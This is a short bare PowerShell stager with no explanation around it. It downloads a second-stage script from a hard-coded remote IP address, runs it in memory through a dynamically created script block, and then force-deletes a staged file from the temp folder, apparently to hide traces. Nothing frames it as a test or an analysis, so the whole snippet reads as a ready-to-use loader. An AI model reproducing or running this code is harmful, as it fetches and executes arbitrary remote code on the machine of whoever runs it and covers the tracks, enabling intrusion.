$RemoteUrl = 'http://203.0.113.240/stage2.ps1'
$DownloadedScript = (New-Object Net.WebClient).DownloadString($RemoteUrl)
& ([ScriptBlock]::Create($DownloadedScript))
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
